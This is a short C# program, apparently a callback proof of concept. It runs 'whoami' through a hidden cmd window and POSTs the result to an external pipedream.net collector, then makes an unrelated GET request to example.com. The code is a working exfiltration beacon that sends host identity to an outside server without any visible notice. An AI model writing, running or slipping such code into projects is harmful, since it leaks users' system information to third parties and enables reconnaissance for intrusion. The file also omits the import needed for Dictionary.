using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
// https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
// https://stackoverflow.com/a/27326758/9329272
//
namespace Testing
{
    public class Program
    {
        static readonly HttpClient client = new HttpClient();
        static void Main()
        {
            string command = "whoami";
			
            var whoami = ExecuteMe(command);

            Console.WriteLine(whoami);

            Task<string> post = PostMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/", whoami);

            Console.WriteLine(post);

            //Task<string> stat = GetMe("http://192.168.1.254:8000");
            string result = GetRequest("https://www.example.com").GetAwaiter().GetResult(); 

            //Console.WriteLine(stat);
        }
        
        private static async Task<string> GetRequest(string url) 
        { 
            using (var client = new HttpClient()) 
            { 
                var response = await client.GetAsync(url); 
                return await response.Content.ReadAsStringAsync(); 
            } 
        } 
        public static async Task<string> PostMe(string url, string whoami)
        {
            var values = new Dictionary<string, string>
            {  
                { "id", whoami }
            };
            //form "postable object" if that makes any sense
            var content = new FormUrlEncodedContent(values);
            //POST the object to the specified URI 
            var response = await client.PostAsync(url, content);
            //Read back the answer from server
            var responseString = await response.Content.ReadAsStringAsync();
            return responseString;
        }
        static string ExecuteMe(string command){
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            // Do not create the black window.
            procStartInfo.CreateNoWindow = true;
            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Get the output into a string
            string ressy = proc.StandardOutput.ReadToEnd();
            return ressy;
        }
    }
}